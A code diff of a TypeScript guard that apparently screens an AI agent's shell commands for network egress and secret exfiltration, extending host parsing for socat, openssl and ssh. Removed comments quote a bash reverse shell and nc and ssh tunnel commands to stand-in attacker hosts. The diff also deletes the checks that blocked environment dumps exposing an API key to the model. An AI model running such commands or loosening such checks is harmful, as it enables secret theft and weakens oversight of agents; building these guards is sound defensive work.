+      .filter((host): host is string => host !== null);
+    return tool === "scp"
+      ? [...remoteHosts, ...hostOptionValues(tool, args), ...sshRoutingHosts(args)]
+          .map(hostFromToken)
+          .filter((host): host is string => host !== null)
+      : remoteHosts;
+  }
+  if (tool === "openssl") {
+    const hosts: string[] = [];
+    for (let index = 0; index < args.length - 1; index += 1) {
+      if (args[index] === "-connect" || args[index] === "-proxy") {
+        const host = hostFromToken(args[index + 1]!);
+        if (host) hosts.push(host);
+      }
+    }
+    return hosts;
+  }
+  if (tool === "socat") return socatHosts(args);
+  let positionals = positionalArgs(tool, args);
+  if ((tool === "http" || tool === "httpie" || tool === "xh") && /^[A-Z]+$/.test(positionals[0] ?? "")) {
+    positionals = positionals.slice(1);
+  }
+  // Only the first host-shaped positional is the destination. Anything after it
+  // is a remote command, which nestedCommands() analyses on its own.
+  const destinations = ONE_DESTINATION_TOOLS.has(tool)
+    ? positionals.filter((argument) => hostFromToken(argument) !== null).slice(0, 1)
+    : positionals;
+  const special = [
+    ...(tool === "curl" ? curlOverrideHosts(args) : []),
+    ...(tool === "ssh" || tool === "sftp" ? sshRoutingHosts(args) : []),
+  ];
+  return [...destinations, ...hostOptionValues(tool, args), ...special]
+    .map(hostFromToken)
+    .filter((host): host is string => host !== null);
+}
+
+// socat names its address family before the destination, and the connecting
+// families are far wider than `TCP:`/`UDP:` — `TCP-CONNECT:`, `OPENSSL:` and
+// `SOCKS4:` all reach a host. LISTEN/RECV families are deliberately absent:
+// they bind locally and carry a bare port, which must not be read as a host.
+const SOCAT_CONNECT_ADDRESS =
+  /^(tcp|udp|sctp|dccp|openssl|ssl|socks4a?|socks5|proxy)[46]?(?:-connect|-c)?:(.+)$/i;
+
+function socatHosts(args: string[]): string[] {
+  const hosts: string[] = [];
+  for (const argument of args) {
+    const match = argument.match(SOCAT_CONNECT_ADDRESS);
+    if (!match) continue;
+    const fields = colonFields(match[2]!);
+    // Proxy families name the proxy first and the real target second.
+    const isProxy = /socks|proxy/i.test(match[1]!);
+    for (const field of fields.slice(0, isProxy ? 2 : 1)) {
+      const host = hostFromToken(field.split(",")[0]!);
+      if (host) hosts.push(host);
+    }
+  }
+  return hosts;
+}
+
+function inlineNetworkHosts(command: string): string[] {
+  const hosts: string[] = [];
+  const patterns = [
+    /(?:connect|getaddrinfo|create_connection)\s*\(\s*\(?\s*['"]([^'"]+)['"]/gi,
+    /(?:resolve|resolve4|resolve6|lookup)\s*\(\s*['"]([^'"]+)['"]/gi,
+    /(?:connect|createConnection)\s*\(\s*\d+\s*,\s*['"]([^'"]+)['"]/gi,
+  ];
+  for (const pattern of patterns) {
+    for (const match of command.matchAll(pattern)) {
+      const host = hostFromToken(match[1] ?? "");
+      if (host) hosts.push(host);
+    }
+  }
+  return hosts;
+}
+
 function extractHosts(command: string): string[] {
   const hosts = new Set<string>();
 
-  // Any scheme, not just http(s): `git push https://...`, `curl -T x ftp://...`,
-  // `npm install --registry https://...` all carry the destination in a URL.
-  for (const match of command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/([^/\s"'`)]+)/gi)) {
-    const authority = match[1];
-    if (authority) hosts.add(authority.replace(/^.*@/, "").split(":")[0]!.toLowerCase());
+  // 1. URL authorities anywhere (any scheme), incl. IPv6 and user@host:port.
+  for (const match of command.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/([^\s\\"'`)]+)/gi)) {
+    const host = hostFromToken("scheme://" + match[1]!);
+    if (host) hosts.add(host);
   }
 
-  // IPv6 literals in brackets, e.g. `curl http://[2001:db8::1]/` or bare
-  // `nc [2001:db8::1] 80`. Without this an IPv6 destination is unreadable.
-  for (const match of command.matchAll(/\[([0-9a-f]{0,4}(?::[0-9a-f]{0,4}){2,})\]/gi)) {
-    const host = match[1];
-    if (host) hosts.add(host.toLowerCase());
-  }
-
-  // Bash raw sockets, e.g. `bash -i >& /dev/tcp/198.51.100.7/9001 0>&1`. Without
-  // this the host is unreadable and a reverse shell that names no secret and no
-  // URL falls through every rule.
+  // 2. Bash raw sockets: /dev/tcp/HOST/PORT.
   for (const match of command.matchAll(/\/dev\/(?:tcp|udp)\/([^/\s"'`)]+)/gi)) {
-    const host = match[1];
-    if (host) hosts.add(host.toLowerCase());
+    if (match[1]) hosts.add(match[1].toLowerCase());
   }
 
-  // Scan for bare hosts with URLs masked out. A domain appearing inside a URL's
-  // path cannot cause egress to itself — the request goes to the authority — so
-  // reading one out of a path is a false positive. Authorities were already
-  // captured above.
-  const withoutUrls = command.replace(/\b[a-z][a-z0-9+.-]*:\/\/[^\s"'`)]+/gi, " URL ");
+  // 3. Destination arguments of an invoked network tool — parsed in-context,
+  // with no filename/code-object filtering.
+  for (const invocation of networkToolInvocations(command)) {
+    for (const host of hostsFromNetworkInvocation(invocation.tool, invocation.args)) {
+      hosts.add(host);
+    }
+  }
 
-  // Bare host arguments anywhere in the command, e.g. `nc attacker.example 4444`,
-  // `ssh -R 9000:localhost:22 relay.attacker.example`, `openssl -connect h:443`.
-  // Scanning only the token after the tool name missed every flagged variant.
-  for (const match of withoutUrls.matchAll(
-    /(?:^|[\s;&|(=@:'"`])((?:[a-z0-9-]+\.)+[a-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}|\d{7,10})(?=[\s;&|)'"`:,]|$)/gi,
-  )) {
-    const token = match[1];
-    if (!token || looksLikeFilename(token) || !isPlausibleHost(token)) continue;
-    hosts.add(token.toLowerCase());
+  // 4. Literal destinations passed to common interpreter networking APIs.
+  if (INLINE_NETWORK.test(command)) {
+    for (const host of inlineNetworkHosts(command)) hosts.add(host);
   }
 
   return [...hosts];
@@ -195,14 +951,13 @@ export function evaluateCommand(
   const allowed = new Set(context.allowedHosts.map((host) => host.toLowerCase()));
   const usesNetwork = usesNetworkTool(command) || INLINE_NETWORK.test(command);
   const secret = findProtectedSecret(command);
-  const dumpsEnvironment = ENV_DUMP.test(command);
 
-  if (usesNetwork && (secret || dumpsEnvironment)) {
+  if (usesNetwork && secret) {
     return {
       rule: "secret-exfiltration",
       detail:
         "Command combines network egress with access to " +
-        (secret ?? "the process environment") +
+        secret +
         ".",
     };
   }
@@ -222,7 +977,7 @@ export function evaluateCommand(
   // This is what catches obfuscated tool names (`c""url`, `$X`, `$'\x63url'`,
   // base64-decoded commands): the binary can be hidden, the destination cannot.
   if (!usesNetwork && disallowed.length > 0 && ANY_URL.test(command)) {
-    if (!TEXTUAL_URL_CONTEXT.test(command)) {
+    if (!TEXTUAL_URL_CONTEXT.test(command) || runsWrittenScript(command)) {
       return {
         rule: "network-egress-denied",
         detail:
@@ -238,18 +993,6 @@ export function evaluateCommand(
     return {
       rule: "protected-secret-access",
       detail: "Command reads " + secret + ".",
-    };
-  }
-
-  // A bare, unfiltered environment dump reveals ARK_API_KEY into the command
-  // output — which the model reads and may echo — even without egress. A
-  // filtered dump (`printenv | grep X`) or a var-setting `env FOO=bar cmd` or a
-  // single-var read (`printenv NODE_ENV`) is fine; only a whole-environment dump
-  // to stdout is denied.
-  if (FULL_ENV_DUMP.test(command)) {
-    return {
-      rule: "protected-secret-access",
-      detail: "Command dumps the full process environment, exposing secrets.",
     };
   }
 
